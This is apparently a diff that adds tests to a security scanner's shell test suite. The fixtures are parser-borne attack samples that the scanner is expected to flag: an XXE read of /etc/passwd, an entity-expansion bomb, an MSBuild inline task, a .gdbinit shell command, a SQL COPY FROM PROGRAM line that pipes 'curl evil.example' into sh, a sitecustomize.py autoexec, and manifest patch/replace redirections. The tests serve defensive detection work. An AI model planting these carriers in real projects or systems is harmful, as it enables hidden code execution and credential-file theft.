@@ -7787,6 +7787,79 @@ printf 'function FindProxyForURL(u,h){return "DIRECT";}\n' \
     || check "file: DIRECT .pac clean" "0" "1"
 rm -rf "$YDIR"
 
+# ─── F31–F35: parser-fed carriers (XXE/MSBuild/dbg rc/sql/py autoexec) ──
+PDIR=$(mktemp -d)
+printf '<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>\n<r>&e;</r>\n' \
+    > "$PDIR/xxe.xml"
+./hlse_core file "$PDIR/xxe.xml" 2>&1 | grep -q "XXE" \
+    && check "file: xml external entity flagged" "0" "0" \
+    || check "file: xml external entity flagged" "0" "1"
+printf '<?xml version="1.0"?>\n<!DOCTYPE b [<!ENTITY a "xxxx"><!ENTITY c "&a;&a;&a;&a;&a;&a;">]>\n<r>&c;</r>\n' \
+    > "$PDIR/bomb.xml"
+./hlse_core file "$PDIR/bomb.xml" 2>&1 | grep -q "BOMB" \
+    && check "file: entity-expansion bomb flagged" "0" "0" \
+    || check "file: entity-expansion bomb flagged" "0" "1"
+printf '<?xml version="1.0"?><root><item>x</item></root>\n' \
+    > "$PDIR/ok.xml"
+./hlse_core file "$PDIR/ok.xml" 2>&1 | grep -q "OK" \
+    && check "file: plain xml clean" "0" "0" \
+    || check "file: plain xml clean" "0" "1"
+printf '<Project><UsingTask TaskName="X" TaskFactory="RoslynCodeTaskFactory"><Code>Evil()</Code></UsingTask></Project>\n' \
+    > "$PDIR/task.csproj"
+./hlse_core file "$PDIR/task.csproj" 2>&1 | grep -q "MSBUILD" \
+    && check "file: msbuild inline task flagged" "0" "0" \
+    || check "file: msbuild inline task flagged" "0" "1"
+printf '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><OutputType>Exe</OutputType></PropertyGroup></Project>\n' \
+    > "$PDIR/ok.csproj"
+./hlse_core file "$PDIR/ok.csproj" 2>&1 | grep -q "OK" \
+    && check "file: plain csproj clean" "0" "0" \
+    || check "file: plain csproj clean" "0" "1"
+printf 'set pagination off\nshell id\n' > "$PDIR/.gdbinit"
+./hlse_core file "$PDIR/.gdbinit" 2>&1 | grep -q "DEBUGGER RC" \
+    && check "file: .gdbinit shell command flagged" "0" "0" \
+    || check "file: .gdbinit shell command flagged" "0" "1"
+printf 'set pagination off\nset print pretty on\n' > "$PDIR/okgdb"
+mv "$PDIR/okgdb" "$PDIR/ok.gdbinit" 2>/dev/null || true
+printf 'set pagination off\n' > "$PDIR/ok.gdbinit"
+./hlse_core file "$PDIR/.gdbinit" --json 2>/dev/null | grep -q "DEBUGGER" ; :
+./hlse_core file "$PDIR/ok.gdbinit" 2>&1 | grep -q "OK" \
+    && check "file: plain .gdbinit clean" "0" "0" \
+    || check "file: plain .gdbinit clean" "0" "1"
+printf 'COPY t FROM PROGRAM '"'"'curl evil.example|sh'"'"';\n' \
+    > "$PDIR/evil.sql"
+./hlse_core file "$PDIR/evil.sql" 2>&1 | grep -q "SQL EXEC" \
+    && check "file: sql copy-program flagged" "0" "0" \
+    || check "file: sql copy-program flagged" "0" "1"
+printf 'SELECT * FROM t WHERE x = 1;\n' > "$PDIR/ok.sql"
+./hlse_core file "$PDIR/ok.sql" 2>&1 | grep -q "OK" \
+    && check "file: plain sql clean" "0" "0" \
+    || check "file: plain sql clean" "0" "1"
+printf 'import os\nos.system("id")\n' > "$PDIR/sitecustomize.py"
+./hlse_core file "$PDIR/sitecustomize.py" 2>&1 | grep -q "AUTOEXEC" \
+    && check "file: sitecustomize exec flagged" "0" "0" \
+    || check "file: sitecustomize exec flagged" "0" "1"
+printf 'import sys\nprint("ok")\n' > "$PDIR/sitecustomize2.py"
+mv "$PDIR/sitecustomize2.py" "$PDIR/normal.py"
+./hlse_core file "$PDIR/normal.py" 2>&1 | grep -q "AUTOEXEC" \
+    && check "file: normal.py no autoexec reason" "0" "1" \
+    || check "file: normal.py no autoexec reason" "0" "0"
+printf '[package]\nname = "x"\n\n[dependencies]\nserde = "1"\n\n[patch.crates-io]\nserde = { git = "https://github.com/a/b" }\n' \
+    > "$PDIR/Cargo.toml"
+./hlse_core package --manifest "$PDIR/Cargo.toml" 2>&1 | grep -q "patch" \
+    && check "manifest: cargo [patch] table flagged" "0" "0" \
+    || check "manifest: cargo [patch] table flagged" "0" "1"
+printf 'module example.com/x\n\ngo 1.21\n\nreplace example.com/lib => ../vendored/lib\n' \
+    > "$PDIR/go.mod"
+./hlse_core package --manifest "$PDIR/go.mod" go 2>&1 | grep -q "local path" \
+    && check "manifest: go local-path replace flagged" "0" "0" \
+    || check "manifest: go local-path replace flagged" "0" "1"
+printf 'module example.com/y\n\ngo 1.21\n\nrequire example.com/lib v1.0.0\n' \
+    > "$PDIR/go-clean.mod"
+./hlse_core package --manifest "$PDIR/go-clean.mod" go 2>&1 | grep -q "OK" \
+    && check "manifest: plain go.mod clean" "0" "0" \
+    || check "manifest: plain go.mod clean" "0" "1"
+rm -rf "$PDIR"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
